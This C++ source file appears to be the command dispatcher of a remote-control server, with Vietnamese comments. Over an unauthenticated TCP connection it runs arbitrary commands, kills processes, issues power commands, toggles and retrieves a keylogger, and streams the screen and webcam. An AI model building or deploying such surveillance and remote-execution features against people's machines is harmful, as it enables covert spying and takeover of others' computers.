// CommandRouter.cpp
#include "CommandRouter.h"
#include "utils/helpers.h"
#include "utils/logging.h"
#include <sstream>
#include <stdexcept>
#include <thread>
#include <atomic>
#include <mutex>

using namespace std;

CommandRouter::CommandRouter() {}

/**
 * @brief Ham chinh xu ly ket noi tu Gateway (TCP).
 * Vong lap nay se chay vinh vien cho den khi Gateway ngat ket noi.
 */

void CommandRouter::handleClient(SOCKET client, string clientIP)
{
    logConsole(clientIP, "Gateway da ket noi TCP.");
    char buffer[4096];
    string line_buffer;

    try
    {
        while (true) // Vong lap doc lenh
        {
            int rec = recv(client, buffer, sizeof(buffer) - 1, 0);
            if (rec <= 0)
                break;

            buffer[rec] = 0;
            line_buffer += buffer;

            size_t pos;
            while ((pos = line_buffer.find('\n')) != string::npos)
            {
                string cmdLine = line_buffer.substr(0, pos);
                line_buffer.erase(0, pos + 1);

                if (cmdLine.empty())
                    continue;
                logConsole(clientIP, "Nhan lenh: " + cmdLine);

                vector<string> args = splitArgs(cmdLine);
                if (args.empty())
                    continue;
                string cmd = args[0];

                // === DIEU PHOI DON LUONG (XOA m_socketMutex) ===
                if (cmd == "GET_PROCS")
                {
                    sendTcp(client, "JSON " + m_processController.getProcessesJson());
                }
                else if (cmd == "GET_APPS")
                {
                    sendTcp(client, "JSON " + m_appController.getAppsJson());
                }
                else if (cmd == "KILL_PID" && args.size() > 1)
                {
                    sendTcp(client, "JSON " + m_processController.killProcess(args[1]));
                }
                else if (cmd == "CLOSE_HWND" && args.size() > 1)
                {
                    sendTcp(client, "JSON " + m_appController.closeApp(args[1]));
                }
                else if (cmd == "START_CMD" && args.size() > 1)
                {
                    string fullCmd = cmdLine.substr(cmd.length() + 1);
                    if (fullCmd.front() == '"' && fullCmd.back() == '"')
                    {
                        fullCmd = fullCmd.substr(1, fullCmd.length() - 2);
                    }
                    sendTcp(client, "JSON " + m_appController.startApp(fullCmd));
                }
                else if (cmd == "POWER_CMD" && args.size() > 1)
                {
                    sendTcp(client, "JSON " + m_systemController.powerCommand(args[1]));
                }
                else if (cmd == "KEYLOG_SET" && args.size() > 1)
                {
                    m_keylogController.setKeylog(args[1] == "true");
                    sendTcp(client, "JSON {\"ok\":true}");
                }
                else if (cmd == "GET_KEYLOG")
                {
                    sendTcp(client, "JSON " + m_keylogController.getKeylog());
                }
                else if (cmd == "GET_DEVICES" || cmd == "REFRESH_DEVICES")
                {
                    bool refresh = (cmd == "REFRESH_DEVICES");
                    sendTcp(client, "JSON " + m_deviceController.getDevices(refresh));
                }
                else if (cmd == "RECORD_VIDEO" && args.size() > 3)
                {
                    sendTcp(client, "JSON " + m_deviceController.recordVideo(args[1], args[2], args[3]));
                }
                else if (cmd == "GET_SCREENSHOT")
                {
                    sendTcp(client, "JSON " + m_screenController.getScreenshotBase64());
                }
                // --- Xu Ly Stream (BLOCKING) ---
                else if (cmd == "START_STREAM_SCREEN")
                {
                    m_screenController.handleScreenStream(client, clientIP);
                    logConsole(clientIP, "Ket thuc luong stream, cho lenh moi...");
                }
                else if (cmd == "START_STREAM_CAM" && args.size() > 2)
                {
                    m_deviceController.handleStreamCam(client, clientIP, args[1], args[2]);
                    logConsole(clientIP, "Ket thuc luong stream, cho lenh moi...");
                }
            } // het while(line_buffer.find)
        } // het while(true)
    }
    catch (const std::exception &e)
    {
        logConsole(clientIP, "LOI: " + string(e.what()));
    }
    catch (...)
    {
        logConsole(clientIP, "LOI KHONG XAC DINH!");
    }

    logConsole(clientIP, "Gateway da ngat ket noi TCP.");
    closesocket(client);
}